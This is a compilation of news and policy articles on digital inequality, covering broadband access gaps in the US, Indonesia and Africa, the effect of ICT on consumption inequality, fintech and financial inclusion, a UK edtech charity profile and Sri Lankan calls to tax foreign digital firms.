Nationwide, 22% of African Americans and 18% of all Americans say they have no internet at home, the report found.

Black Residents Shut Out

Both a lack of available high-speed internet services and a lack of financial resources contribute to the striking gap, the study said.

Among residents in the regions Harrison studied, data from the Federal Communications Commission (FCC) found that more than a quarter do not have the option to subscribe to high-speed broadband, with internet speeds of at least 25/3 megabits per second. Out of all Americans, that figure is 3.8%.

Households with annual incomes of less than $35,000 account for nearly 61% of Black households in the areas Harrison focused on — compared to about 29% of households across the country, according to the report.

""Before we can even consider affordability, Black residents are being shut out of access at shocking rates, and countless more with high prices and insufficient federal support,"" Harrison said.

""Internet service providers say it's not profitable to build in those communities,"" she said, adding that a mix of well-targeted subsidies, federal investments and municipally-built broadband would help plug that gap.

Wake-Up Call

Among other items, the infrastructure package includes $42.5 billion for states and territories with the goal of targeting communities that lack high-speed internet and about $14 billion to extend and revamp an FCC program that subsidizes access for lower-income households.

Nicol Turner Lee, director of the Center for Technology Innovation at the Brookings Institution, said the report should be a wake-up call for investments to be made not only in physical infrastructure, but also in educational programs and digital literacy initiatives.

""[Lack of broadband access] undermines everything, from those seeking jobs to those seeking public benefits to healthcare access — it's the whole nine yards,"" Turner Lee said.

Roughly a quarter of adults with annual household incomes below $30,000 don’t own a smartphone.

Americans with higher household incomes are more likely to have multiple devices that enable them to go online.

The digital divide has been a pressing topic for decades, but COVID-19 made those who lack web access more likely to fall further behind.

More than 30 years after the debut of the World Wide Web, internet use, broadband adoption and smartphone ownership have grown rapidly for all Americans – including those who are less well-off financially. However, the digital lives of Americans with lower and higher incomes remain markedly different, according to a Pew Research Center survey of U.S. adults conducted Jan. 25-Feb. 8, 2021. In fact, the shares of Americans in each income tier who have home broadband or a smartphone have not significantly changed from 2019 to 2021.

Roughly a quarter of adults with household incomes below $30,000 a year (24%) say they don’t own a smartphone. About four-in-ten adults with lower incomes do not have home broadband services (43%) or a desktop or laptop computer (41%). And a majority of Americans with lower incomes are not tablet owners. By comparison, each of these technologies is nearly ubiquitous among adults in households earning $100,000 or more a year.

Americans with higher household incomes are also more likely to have multiple devices that enable them to go online. Roughly six-in-ten adults living in households earning $100,000 or more a year (63%) report having home broadband services, a smartphone, a desktop or laptop computer and a tablet, compared with 23% of those living in lower-income households.

Conversely, 13% of adults with household incomes below $30,000 a year do not have access to any of these technologies at home, while only 1% of adults from households making $100,000 or more a year report a similar lack of access.

With fewer options for online access, Americans on lower incomes are relying more on smartphones more. Image: Pew Research Center

With fewer options for online access at their disposal, Americans with lower incomes are relying more on smartphones. As of early 2021, 27% of adults living in households earning less than $30,000 a year are smartphone-only internet users – meaning they own a smartphone but do not have broadband internet at home. This represents a substantial increase from 12% in 2013. In contrast, only 6% of those living in households earning $100,000 or more fall into this category in 2021. These shares are statistically unchanged since 2019, when the Center last polled on this topic.

This reliance on smartphones also means that the less affluent are more likely to use them for tasks traditionally reserved for larger screens. For example, smartphone owners with lower incomes were especially likely to use their mobile device when seeking out and applying for jobs, according to a 2015 Pew Research Center report.

The disparity in online access is also apparent in what has been called the “homework gap” – the gap between school-age children who have access to high-speed internet at home and those who don’t. In 2015, 35% of lower-income households with school-age children did not have a broadband internet connection at home, according to a Pew Research Center analysis of U.S. Census Bureau data.

Most of the world lives in areas covered by a mobile broadband network, yet more than one-third (2.9 billion people) are still offline. Cost, not coverage, is the barrier to connectivity. At The Davos Agenda 2021, the World Economic Forum launched the EDISON Alliance, the first cross-sector alliance to accelerate digital inclusion and connect critical sectors of the economy. Through the 1 Billion Lives Challenge, the EDISON Alliance aims to improve 1 billion lives globally through affordable and accessible digital solutions across healthcare, financial services and education by 2025.

The digital divide has been a central topic in tech circles for decades, with researchers, advocates and policymakers examining this issue. However, this topic has gained special attention during the coronavirus outbreak as much of daily life (such as work and school) moved online, leaving families with lower incomes more likely to face obstacles in navigating this increasing digital environment. For example, in April 2020, 59% of parents with lower incomes who had children in schools that were remote due to the pandemic said their children would likely face at least one of three digital obstacles to their schooling, such as a lack of reliable internet at home, no computer at home, or needing to use a smartphone to complete schoolwork.",Digital Inequality,2021-06-30 07:00:00

Kai Arvai, Katja Mann

When considering the effect of digitalisation on inequality, researchers usually focus on income inequality. This column compares the consumption baskets of US households to study the effect of digitalisation on consumption inequality. High-income households have a higher share of ICT-intensive products in their consumption, and thus benefit more from price declines in these goods due to digitalisation. The price channel accounts for 22.5% of the increase in consumption inequality between 1960 and 2017.

Does digitalisation make the world more unequal? Economic research so far seems to suggest yes. There is substantial evidence that digitalisation leads to an increase in income inequality throughout the Western world (Akerman et al. 2015, Gaggl and Wright 2017, Burstein et al. 2019).1 As the literature shows, information and communication technology (ICT) tends to make high-skilled workers more productive, whereas low-skilled workers are often made redundant. As a result, the skill premium rises.

We thus know a lot about digitalisation and incomes by now. From a welfare perspective, however, we care more about consumption. Digitalisation affects consumption inequality not only through income changes, but also through changes in consumer prices. A priori, it is unclear whether this price effect works in the same or opposite direction from the income effect. If the increased use of digital technology makes some consumption goods cheaper than others, it will benefit the income groups that consume relatively more of these goods. Depending on what those goods are, either rich or poor households could be the beneficiaries.

In a new paper (Arvai and Mann 2021), we study the effect of digitalisation on consumption inequality, quantifying both the income and price effect. We use US household data to document that the price effect works in the same direction as the income effect, favouring high-income households. In a two-sector growth model, we show that the price channel accounts for 22.5% of the increase in consumption inequality between 1960 and 2017. This implies that digitalisation has more uneven effects than the increase in income inequality suggests.

Digitalisation and consumption inequality in the data

To study how households differ in their consumption of digital products, we develop a new measure of the ICT share of consumption goods. Our approach focuses on the capital stock used in production, and we study to what extent an industry uses digital assets, like computer software and hardware or intellectual property products, rather than non-digital equipment and structures like production plants.

Assembling data across 61 industries between 1960 and 2017, we find that the average share of ICT capital in the overall capital stock has increased from virtually 0% in 1960 to 16% in 2017, with large variation across industries. We account for the digitalisation content of intermediate products by relying on the input-output structure of the production network and derive a digitalisation measure of final commodities.

We link this measure to the US Consumer Expenditure Survey, an annual survey on the spending patterns of American households, and in this way compute the overall ICT share of consumption of individual households. Figure 1 shows which categories matter for high- and low-income households and how they differ in their ICT intensity. Low-income households disproportionately consume food and textiles, which are produced using a low ICT share. In contrast, categories that tend to be more important for rich households, such as finance and insurance or education, have higher ICT shares. We also document that consumer price inflation has been weaker for ICT-intensive commodities, which means that digitalisation benefits consumers of ICT-intensive goods.

Figure 1 ICT intensity and relative expenditure shares by commodity in 2017

Notes: Each circle corresponds to a commodity. The size of the circle reflects the share of expenditures for that category of the median household. The x-axis shows the log ratio of the expenditure share of the top 10% relative to the bottom 10%. The more to the right, the more important a category is for the rich. Values around zero indicate that a category is equally important to rich and poor. The y-axis shows the ICT intensity of the commodity, the horizontal green line indicates average ICT intensity. Data are for 2017. \

Figure 2 shows our comprehensive measure of ICT intensity of consumption for households at different percentiles of the income distribution. Households in the tenth percentile have a 13% higher digital share in their consumption basket than households in the first percentile, and the difference has become more pronounced over time.

A simple model to quantify the income and price channel

To find out how important changes in prices and changes in incomes are for consumption inequality, we construct a two-sector growth model. Output of both sectors is produced using two types of capital, ICT capital and non-ICT capital. Sector 2 uses ICT capital more intensively than sector 1. The economy is populated by two types of agents that differ by skill endowment. High-skill labour is complementary to ICT capital, whereas a composite good constructed from these two inputs is substitutable to low-skill labour. Digitalisation is modelled as an increase in the rate of transformation of output into ICT capital (Karabarbounis and Neiman 2014). The ICT-intensive sector 2 benefits relatively more from this technology trend, which means that the relative price of sector 1 increases. At the same time, the skill premium increases. In a setting with non-homothetic preferences, the effect of changing relative prices depends on the agent's position in the income distribution. In line with our empirical findings, we assume that the ICT-intensive good is the luxury good, which is consumed more intensely by the high-skill, high-earner households.

We calibrate the model to the US economy between 1960 and 2017 such that we match both the increase in the skill premium and the increase in the relative price of non-ICT goods. Consumption inequality increases by 18.1%. To express this number in monetary units, we do a compensatory variation, asking how much additional income we need to give to households in 2017 in order to compensate them for the change in the relative price. Then we compare this number to the actual income increase. The left panel of Figure 3 shows that high-income households benefit both by requiring a lower level of compensatory income and by receiving a larger increase in actual income. They experience an increase in welfare that is equivalent to 22.3% of their initial income, while low-skill households only experience an increase of 5.3%.

To assess the relevance of the income and price channel, we carry out a counterfactual exercise. We quantify how much the price channel contributes to consumption inequality by comparing consumption in the baseline model to a version with fixed relative prices. The right panel of Figure 3 shows that without the relative price change, consumption inequality would have increased by 22.5% less. So, it is important to take the price channel into account. In providing a first estimate of the size of this channel, our paper offers a starting point for more follow-up research on the effect of digitalisation on welfare and inequality.

Figure 3 Welfare decompostion

Notes: The left panel shows how much income households get with the compensatory variation (blue) and how much income households actually get in 2017 (red) relative to the initial 1960 income. The right panel shows relative consumption in the baseline model (red solid line) and in a counterfactual exercise where prices remain constant (dashed blue line).

This blog post is part of a series of blogs discussing the digital divide in the context of broadband internet access, mobile internet access, digital economy and digital governance, relying on results of the Beyond Unicorn report.","The Internet is one of the greatest innovations of our time and holds great potential for creating a more prosperous and equal society. It enables small businesses to access worldwide markets. It is a learning resource that allows pupils in the poorest and most remote locations to access the same information as children in wealthier regions. It provides opportunities for rural households to obtain digital health services wherever they are. It is a virtually free “news agency,” allowing individuals to share information with many others, and enables free speech.

However, not everybody has access to the Internet. In Indonesia in 2019, 94 million adults were unable to access the Internet on a mobile device and even fewer people had access to fixed broadband internet. Nearly 80 percent of those not connected reside in non-metro rural areas of Sumatera, Java and Bali islands, which are the country’s three most populous islands. On top of that, 60 to 70 percent of Indonesians living in the country’s eastern region are inadequately connected due to variable quality of service.

This divide between Indonesia’s digital haves and have-nots reinforces the country’s socio-economic disparities. As the World Bank’s Beyond Unicorn report shows, young adults are ten times more likely to have mobile internet access than senior citizens. At the same time, those with tertiary education are five times more likely to connect than those whose education is limited to junior secondary attainment or less. In addition, individuals from low-income families are three times less likely to have Internet access than children born in the most prosperous families.

These disparities will hold back economic growth and will widen the social gap as opportunities are seized by those who have Internet access but not those who may need them most. This situation is aggravated by conditions beyond individual control, such as where people live or their families’ economic circumstances. This will ultimately create costs for the society in terms of foregone human capital and loss of economic potential. Breaking down barriers to mobile internet connectivity in Indonesia will be crucial to delivering the digital economy's benefits for all.

Nearly half of Indonesian adults did not own an internet-enabled phone (e.g., smartphone) before the COVID-19 pandemic, creating a fundamental barrier to going online. These devices are still unaffordable for many people, even though prices for mobile phones have dropped sharply over the last decades. Buying the least expensive internet-enabled phone would cost the equivalent of one fifth of the monthly expenditures of a low-income person. Compounding this challenge, prices for mobile devices can be dramatically higher in rural and remote areas, where most of the unconnected people reside. In addition to price, limited familiarity with digital platforms and services is a constraint for many.

The Beyond Unicorn report identifies several steps that could help bridge the digital divide. First, Indonesian mobile network operators need better access to spectrum bands, which are necessary to provide network services. While inefficiencies in spectrum allocation limit coverage expansion and contribute to network congestion, the unavailability of specific high-frequency capacity bands hinders the deployment of a more efficient 5G mobile technology. While the regulations derived from the Omnibus Law No. 11/2020 on post, telecommunication and broadcast already impose a mandatory two-year plan to convert analog television into digital to preserve the spectrum for the 4G network, the government could also consider releasing the band previously used for satellite television to relieve network congestion in urban areas.

Second, Indonesia needs to ensure affordable access to information and communication technology (ICT) devices, such as computers and internet-enabled phones, especially in remote and rural locations . By improving access to the global digital marketplace and expanding road access to remote villages, Indonesia can reduce price disparities between urban and rural markets that arise from expensive logistic or travel costs. In addition, specific educational programs for low-income families can ensure that children are able to learn digital skills to avoid intergenerational transmission of ""digital poverty"" and lack of digital opportunities.

Finally, improving digital skills among Indonesia's population will remain a key priority for narrowing the digital divide. For a senior citizen or the poorest individuals, the probability of accessing the Internet increases dramatically with improved education attainment, emphasizing the linkage between education and technological adoption. This shows that to fully reap the promise of digital opportunity, Indonesia needs to build an educational system that not only uses digital technologies, but also promotes digital skills and productive usage of the Internet among all levels of society. The formal educational system as well as community or lifelong learning programs need to offer basic digital literacy, especially for the older generation that is still mostly left unconnected.

This has serious implications for identifying, taking action on and evaluating progress toward digital gender equality on the continent.

This is according to the Sex-Disaggregated ICT Data in Africa report conducted by the Equals Research Coalition, a coalition of stakeholders dedicated to promoting digital gender equality, co-founded by the International Telecommunication Union and partners.

The new report aims to enhance understanding of the full extent of the data gap, with an analysis of the availability and coverage of sex-disaggregated data in Africa in internationally available databases.

The analysis covers 11 indicators of ICT access, skills and leadership between 2010 and 2020.

According to the report, there is a need for better data collection across the continent, as many African countries currently lack surveys to collect sex-disaggregated ICT data. When surveys are conducted, there is also a gap in who is included in the results, it notes.

The research further points out that one-fifth of all African countries with data cannot construct a time series of sex-disaggregated ICT data for any indicator, limiting the ability to track changes in digital access, skills, or leadership over time.

“Monitoring data on a sex-disaggregated basis is only possible on a delayed schedule because much of the sex-disaggregated ICT data are many years out of date in Africa.

“Furthermore, little to no data is available on cyber violence on the continent − a widespread, but difficult to capture, aspect of gender-based violence. There is a need to prioritise collecting this data to ensure governments and private companies can make laws and products that protect women and girls from online abuse.”

On average, the most recent data-point across all African countries, indicators and disaggregation available is from 2016, notes the report.

The countries with the timeliest sex-disaggregated data are Algeria, Rwanda, Seychelles, Tunisia and Zambia, with the most recent data recorded being from 2018.

While they do not have timely sex-disaggregated data, Cote d’Ivoire and Egypt have 2018 data available for the total population. In contrast, Gambia and Liberia have the least timely data for both men and women, as the most recently available data on multiple indicators is from 2012. Liberia also has an average latest year of 2012 for the total population for three indicators.

In Africa, there is no specific data available on a country-wide level on gender pay gaps within the ICT profession, according to the Equals Research Coalition.

The study highlights the importance of pairing inclusive labour policies with more data-gathering efforts to understand the ICT field of employment and new industries emerging from the digital economy.

“This lack of available info mirrors the difficulty in consistently capturing the economic contribution of women in a standardised way and the lack of focus this topic has received from the statistical community, even in advanced economies such as SA. A full accounting of women’s contributions to the economy, including in sectors such as ICT, is necessary to capture the true extent of gender inequality and find ways to address it,” notes the study.

Aside from employment in ICT professions such as mobile network operators, software companies, or digital services companies, the study highlights more Africans are starting to find employment in ICT-enabled professions. This is most notable in the rise of ‘gig work’, which entails fulfilling micro-tasks online or deliveries placed through digital fulfilment services.",Digital Inequality,2022-06-13 10:09:18

In what ways are the new technologies altering growth, employment, and distributional dynamics? How are they affecting inequality within economies and prospects for economic convergence between economies? How can the promise of today’s technological transformation be harnessed to promote more inclusive growth and development? Can an inclusive future be envisioned in the digital era? What are the implications for public policy? What new thinking and adaptations are needed to realign institutions and policies with the digital economy, at national and global levels—and to shape technological change itself?

A recently published report, “An Inclusive Future? Technology, New Dynamics, and Policy Challenges,” addresses these questions. This report is part of ongoing research under the Brookings Global Forum on Democracy and Technology that seeks to promote ideas and policies to manage technological change to build inclusive prosperity and strengthen democratic societies.

On June 14, the Global Economy and Development program at Brookings will host an online event on the issues addressed in the report. Author presentations will be followed by a discussion.

“Almost half the world’s population, 3.7 billion people, the majority of them women, and most in developing countries, are still offline”, Ms Mohammed told ambassadors, tech experts and representatives from civil society groups.

“Collectively, our task is to help design digital environments that can connect everyone with a positive future. This is why we need a common effort, with collaboration among national and local governments, the private sector, civil society, academia and multilateral organizations.”

A fragmented digital space

Ms Mohammed outlined areas for global cooperation, highlighting the key role the UN has in responding to what she characterized as the growing fragmentation in the digital space.

“Geopolitical fault lines between major powers are emerging, with technology as a leading area of tension and disagreement”, she said. At the same time, tech companies are responding in different ways to issues surrounding privacy, data governance and freedom of expression.

The situation is made worse by the deepening digital divide between developed and developing countries, she added, resulting in global discussions on digital issues becoming less inclusive and representative.

‘Global town hall’ needed

“Now more than ever, we need a global townhall to address these issues and to capitalise on technology’s transformational potential to create new jobs, boost financial inclusion, close the gender gap, spur a green recovery and redesign our cities”, she said.

The UN deputy chief underlined the value of engagement, as achieving universal connectivity cannot be left solely to governments or individual tech companies.

She stressed that no single country or company “should steer the course of our digital future”.

Development depends on connectivity

The General Assembly debate sought to generate political commitments to address the widening digital divide as pandemic recovery efforts align with the push to achieve the Sustainable Development Goals (SDGs) by the end of the decade.

“In a world of unparalleled innovation, where our loved ones are but a video call away, billions struggle to access even the most basic elements of connectivity or live with none at all. Truly, for billions of people the pace and scale of sustainable development is reliant upon digital connectivity,” said Volkan Bozkir, the General Assembly President.

He stressed that “now is the time to act” as the digital divide, which existed long before COVID-19, was only made worse by the crisis. However, recovery offers the chance for true transformation.

“As I have frequently stated, we must use the SDGs as a guide to our post-COVID recovery. This means ensuring that no one is left behind, no one is left offline, and that we apply a whole-of-society, multi-stakeholder, and intergenerational approach to our efforts”, he said.

“This is particularly important for the world’s 1.8 billion young people, who must be equipped with the skills and resources to thrive in an ever-changing, tech-driven future.”

Mr Bozkir called for strengthening implementation of initiatives such as the UN Secretary-General’s Roadmap for Digital Cooperation, launched last June.

Surprisingly, quite a lot. During the pandemic, as governments around the world moved quickly to provide much-needed financial assistance to its citizens, the West African country of Togo faced a challenge: how to identify its most economically vulnerable citizens and get money into their hands.

In partnership with a U.S.-based charitable organization called GiveDirectly, the Togolese government used an AI algorithm that analyzed satellite image data to target pockets of poverty in the country. “You can use different kinds of proxies for income level, like the types of roofing materials that are used,” says Robert Opp, chief digital officer at the United Nations Development Programme. For example, villages where homes predominately have thatched roofs are more likely to be economically disadvantaged compared with villages with metal roofs. The project in Togo helped the government target its financial assistance efforts to those who needed it most. What’s more, it offers a powerful illustration of how digital tools are helping to address issues of economic inequality around the world. “GiveDirectly has greatly increased the capacity to get money quickly into the hands of people who need it,” says Michael Froman, vice chairman and president of strategic growth at Mastercard and chairman of the Mastercard Center for Inclusive Growth. “It’s been able to bring the tools of the digital economy—like data science—to the table in a way that promotes inclusion, not exclusion.” THE DIGITAL DOWNSIDE Our increasingly digital world is decidedly double-edged. Tools like AI and machine learning are helping to bridge the economic-inequality gap through innovative means. But a lack of access to basic digital tools such as smartphones and wireless data is limiting the economic opportunities for wide swaths of people around the world. The United Nations recently announced that nearly half the world’s population—some 3.7 billion people—are still offline. “The majority of issues with this digital divide is that people either can’t afford or don’t know how to use digital devices that are connected,” Opp says.

Access is a major problem in the developing world, where most of these 3.7 billion people live. But developed countries such as the United States aren’t immune to access issues. Some estimates put the number of Americans without access to broadband internet at 42 million—nearly 13% of the U.S. population. Among Blacks and Hispanics, that percentage is considerably higher. Wole Coaxum, CEO of MoCaFi, a financial technology firm focused on closing the racial wealth gap, likens a lack of broadband connection to a critical infrastructure failure. “That’s the 2021 version of access to electricity and clean running water,” he says. An inability to access fast and reliable internet service puts individuals at a considerable economic disadvantage. That became even more acute during the pandemic, when so much financial activity—from traditional banking services to sending and receiving payments—quickly moved into the digital realm. That transition left many people behind. In the U.S., a record number of bank branch closures meant people without internet access had few options for efficiently managing their financial lives. “You have some families spending money on expensive financial-services products like payday loans, check-cashing fees, and the like,” Coaxum says. “They can spend more on those fees in a year than they do on food.” Globally, individuals whose livelihoods relied on in-person, cash-based transactions—whether a farmer in Uganda or a fish merchant in the Philippines—faced considerable obstacles. For starters, social distancing during the pandemic meant fewer opportunities for in-person transactions. But for those individuals without the means to bank digitally, it has also meant a lack of financial history that makes it more difficult to build their businesses. “If you don’t have the ability to show credit history, you’re not really able to access financial services to get loans and other services like that,” Opp says.

THE POWER OF SIMPLE INNOVATIONS Globally, efforts to bridge this digital divide are gaining ground. Organizations are working with telecom companies in developing nations to drop the cost of airtime to give merchants and individuals more opportunities to conduct transactions digitally. In fact, several mobile providers in Africa waived access fees during COVID-19 to encourage more digital transactions, which Opp says likely helped to increase adoption of these services. Innovative digital tools are also helping to connect the unconnected to crucial financial services. Recently, MoCaFi and Mastercard partnered with the city of Los Angeles to create the Angeleno Connect Card, a digital card and app that gives L.A. residents without bank accounts access to a broad range of financial services, from remote check deposit to no-fee cash deposits at places such as CVS or 7-Eleven. It also allows the city government to funnel funds to those in need quickly and efficiently. “These are the kinds of things that can be done all over the country—and all over the world,” Froman says. “They’re relatively simple innovations, but they can help transform people’s everyday lives in a very positive way. It provides the comfort and safety net that comes from knowing they have access to the resources they need in times of trouble.”",Digital Inequality,2021-11-12 08:00:00

However, there are challenges to fostering financial inclusion, particularly in the developing world.

New technologies can help improve access to affordable financial products and services.

Financial inclusion is the cornerstone of not only a fair, equitable society but also a thriving economy. Boosting financial inclusion and access to finance can make crucial contributions to economic development, enabling social mobility and ensuring that the largest number of people can participate fully and effectively in economic life.

According to the World Bank, financial inclusion “means that individuals and businesses have access to useful and affordable financial products and services that meet their needs – transactions, payments, savings, credit, and insurance – delivered in a responsible and sustainable way”.

Financial inclusion solves societal challenges

Financial inclusion helps to solve a number of societal issues, such as economic growth, employment, poverty, and income equality in both developed and developing countries. However, the issues and challenges of fostering financial inclusion are particularly salient in the developing world.

It is positively associated with GDP growth, by up to 14% in developing economies. As a key element of social inclusion, financial inclusion is especially useful in tackling income inequality and poverty by increasing advancement opportunities for disadvantaged populations in emerging economies.

Access to a transaction account is usually seen as the first step towards financial inclusion by enabling people to make and receive payments, as well as save their money.

This means that they can live their lives more easily, move towards achieving their goals, prepare for emergencies, grow their businesses, invest in education and health care, and gain easier access to other financial services, such as insurance and credit.

A third of world’s adults remain unbanked

Although significant steps have been made to increase financial inclusion – World Bank data indicates that 69% of adults worldwide have a transaction account – roughly one-third of adults, about 1.7 billion people, remain unbanked, according to its latest Findex Report.

The report also highlights the barriers women face. Despite overall progress in financial inclusion, the gender gap in account ownership has remained persistent at nine percentage points since 2011.

New technologies to drive financial inclusion

As we seek to make greater strides to close the financial inequality gap, we turn to novel solutions and approaches to make a difference.

The COVID-19 pandemic has accelerated this creation and adoption of new technologies.

Boosted by social distancing measures, in 2021 the number of contactless payment transactions in Turkey doubled compared to 2020, accounting for half of all in-store payments, whilst the payment amount increased three-fold, according to the Interbank Card Center of Türkiye.

The approach to financial inclusion has transitioned from finding solutions for general problems to addressing specific needs of distinct communities. To support financial inclusion, countries need to develop strong fintech ecosystems, which help to make financial services more accessible to an increasing number of people.

New finance hub supports emerging technologies

In Turkey, we are opening the Istanbul Financial Center, which will support and grow the country’s financial technology system, by providing a base for fintech companies to pilot their products and test their technologies and applications in a regulatory simulation.

As Turkey is a country with a complex, diversified economy – according to Harvard Growth Lab’s ATLAS of Economic Complexity, Turkey ranks third in the world – one of our goals at the Istanbul Financial Center is that this diversification will encourage and nurture the development of highly diversified financial services, which will in turn help to increase financial inclusion.

Customers are turning increasingly to digital and mobile channels, as these fintech solutions often provide a lifeline to many segments of society. With 40% of its population aged under 25 and a 95% mobile phone penetration rate, Turkey has positioned itself as a highly attractive market for mobile banking.

There are approximately 78 million digital banking customers in the country as of September 2021, according to the Banks Association of Türkiye.

New technologies in mobile banking have also begun to support individual entrepreneurs and SMEs with their digital transformation and e-commerce journeys.

For example, there is a solution that can turn a mobile phone into a point-of-sale system (POS), which is addressing the needs of more than 700,000 micro, small and medium-sized enterprises (MSMEs) in Turkey, providing them with access to the financial system and people using credit cards.

Alternative instruments for financial inclusion



Scepticism about traditional financial services also plays a role in access to finance. There is huge potential for alternative instruments to help more people become a part of the investment ecosystem.

For example, Islamic finance provides a comprehensive framework to enhance financial inclusion through the principle of risk-sharing and through Islam’s redistributive channels.

In Islamic finance, financial inclusion entails access to finance from two points: promotion of risk-sharing contracts through the provision of feasible and non-interest finance, and the provision of income redistributions instruments for poverty alleviation.

Islamic finance promotes risk sharing

Islamic finance offers a set of financial instruments promoting risk-sharing, rather than risk transfer, in the financial system.

In addition, it advocates for redistributive risk-sharing instruments through which the economically more able segment of the society shares the risks facing the less able segment of the population.

Conventional modes of enhancing financial inclusion can be replicated through instruments of Islamic finance, allowing risk-sharing and diversification.

New approach to finance for a fairer economy

With the technology improving constantly, it will be possible for populations to have access to financial products and services that will drive financial inclusion to much higher levels.

One of the things I’ve noticed as we’ve come out of Covid is the energy levels have gone down.
I think there’s some way to go.","It’s been a good year for edtech charity the National (previously London) Grid for Learning. It won double at both BETT in March and the Education Resources Awards (ERA) in May.

CEO John Jackson received an ERA Outstanding Achievement Award for his work helping schools adopt new technology and save money, and his dedication to keeping children safe, tackling inequality, energising teaching and learning, and promoting wellbeing.

The trust became somewhat of a lifeboat for many schools during the pandemic. In the early weeks, John made the decision to buy up two million Chromebooks and WinBooks and get them into schools at reduced prices.

He explains how this came about: “Laptops weren’t part of our core business but people were ringing me at the start of Covid saying, ‘We can’t afford this kit, we’ve got to shut the school, kids haven’t got access at home because they simply haven’t got the cash – can you help?’.”

This was a time when there was a worldwide scramble for devices as students and employees headed home for lockdown, which drove up costs and ate up supply. LGfL’s national procurement campaign ensured that even disadvantaged pupils and families in deprived areas had access to incredibly necessary technology.

“No one else was crazy enough to go out for two million devices without a single audit,” says John. “I said I was going to buy them and at first everybody was laughing; then they realised I was dead serious, and then bought into it.”

“I’m not a shrinking violet in terms of risk,” he adds.

LGfL made its content remotely accessible to any school in the country, completely free of charge, which included cloud technology and filtered internet connection. It also supported the 2020 Edtech Demonstrator Programme which was developed by the Department for Education (DfE) and provided free, peer-to-peer technology advice between schools and became a critical support system over the last two years.

What drove John was his positioning of the pandemic as an opportunity, and his mantra that LGfL, and schools, would “come out stronger, technologically, than when they went into the crisis”.

For someone else to cite ‘community spirit’ as the reason behind their work ethic, it could sound cliche. But John is genuinely, authentically, upbeat about the educational sector. “This is why I’m in education. I feel privileged to work with teachers, and schools, because there’s so much good, so much positivity there.”

He hopes to celebrate this, and the ‘legends of learning’, at the next LGfL conference in July, which will draw hundreds of attendees from network schools. “I think teachers did a miraculous thing to keep a lid on all of this, you know, largely, and help families and communities through it. And I think, I think it’s important, we recognise that, you know, and celebrate.”

Looking to the future John wants to see the British edtech sector come into its own, mentioning “cool stuff” like Pobble, a platform for teachers to easily share lesson ideas and resources, and LGfL’s partnership with Ohbot’s Picoh robot which children can program to speak and perform tasks.

He also mentions the companies making great strides with assistive technology, like the AV1 robot that lets children stay in touch with classmates during long-term absences. LGfL has long been an advocate for augmented virtual reality, and John speaks with an infectious passion about the possibilities of VR in the classroom – bringing history lessons to life in a brand new way, helping children see the world without leaving their desks, and showing them a different side to learning.

Whilst John is focused on progression, he knows a key part of moving forward is developing resilient technology that is not only designed for capacity, but reliability, for years to come. Schools cannot afford to have their systems shut down every time they install new platforms, move to the cloud, or upgrade to multi-gig.

He says that it is technology’s job to follow and facilitate societal shifts: “Technology really is about enabling fundamental change. So it’s actually the change that you really need to think through and the technology comes in the slipstream of change, if you like.”

“This is a marathon, not a sprint. One of the things I’ve noticed as we’ve come out of Covid is the energy levels have gone down. I think you’ve got to have a mentality that you’re going to keep at it.

“You cannot ignore the challenges of the teaching profession to get confident, remain confident with harnessing technology, and how to use it in classroom practice. I think there’s some way to go.

“We need to make sure we are properly evaluating the impacts of technology. I think there’s a lot of work to do on digital strategy and toolkits that allow schools to fit it all together: the financial planning, the teacher training, the changes in working practice, the headspace to make the curriculum changes, and manage risks.”

Fast innovation has other issues. Some are starting to notice the problems that come with having a technological sector that is essentially unregulated. One major company hikes its prices, and the rest must follow suit to have any chance of staying in the market; a new social platform prides itself on open access and unmoderated content, which comes with the potential for children to come across extremist views and explicit imagery.

John points out that the blinding pace of technological innovation is a major challenge for the government, whose legislation and processes simply cannot keep pace. Left unaddressed, there could be worrying financial, societal and safeguarding implications from this mismatch.

This bothers him: “What you should have in an economy is regulation on things that have a significant impact on your economy, or on your society, or have a potentially dysfunctional market. Because if you don’t, if you have things that are important, but have very little [regulation], it’s a bit like the Wild West. The consequences are going to be ultimately difficult and negative.”

He says finding a solution is ‘bloody complicated’, but that “it’s a question we should be asking ourselves – how do we do this better?”

John Jackson and co. have supported teaching staff, school bodies, pupils, and families through a particularly tough couple of years, and it looks like they’re now ready to take the sector to new heights – digital equality, online safety, virtual reality, robots and all.

by Sanath Nanayakkare

FITIS, the voice of Sri Lankan Information and Communication Technologies industries urges the government to bring foreign digital companies operating in Sri Lanka, under a local regulatory system where they are liable for taxes and other regulations like their local counterparts.

“Apart from the lack of fairplay for local companies, these foreign digital operators take millions of dollars out of the country every year. In a situation where Sri Lanka is strapped for dollars to buy essentials like medicine, fuel and food and banks are unable to issue dollars to students sitting for foreign exams can we any longer afford this foreign exchange outflow for locally consumed services?,” FITIS asks.

The Digital Chapter of the Federation of Information Technology Industry Sri Lanka (FITIS) states that the recent imposition of taxes by the government is understandable in the current circumstances, at this critical point of nation building. However, there are other factors that need to be looked at and changed if we are to progress with the digital economy connected to digital platforms, they say.Channa de Silva, President of the FITIS Digital Chapter says, “Digitalisation is a way forward that can rationalise all our economic activities as well as being a leveller that democratises opportunity. However, if we don’t treat every player in the field the same way, it can create inequality, monopolies and result in heavy losses to the economy.”

The following are some comments made by Channa de Silva.

“A viable and healthy ecosystem for startups and entrepreneurs to exist requires rules and regulations that ensure fairplay, especially when they compete with global giants who enter local markets. Therefore, a level playing field for everyone is an urgent need in this particular sector, and one way to ensure that is to bring foreign digital companies operating in our markets under a local regulatory system where they are liable for taxes and other regulations. For example, well known foreign digital operators handling ride-sharing and transport of goods in Sri Lanka, use our road networks, fuel subsidies and state infrastructure to further their businesses, yet they have an unfair advantage over their tax paying local counterparts.”

“Foreign players have enjoyed this tax free haven for many years, which is a good case study of a lack of fairplay for equivalent local operators in the industry. These operators, by refusing to register as local entities, do not follow any of the laws of Sri Lanka and avoid paying local taxes. They are operating under the misapprehension of not being liable to pay taxes in areas they operate, outside their country of origin. However, this is a stand that has been challenged by countries like India who have won the battle to be treated on an equal footing.”

“The fact that India has been fighting the issue of taxing foreign digital services for a long time is well documented in the media. They were the first to introduce a digital tax called the ‘Equalisation Levy,’ back in 2016, which was payable by Indian residents for online advertisement services purchased from non-resident companies. Later, the Equalisation Levy was extended to include a 2% levy on all online sale of goods or services into India by non-resident e-commerce operators.”

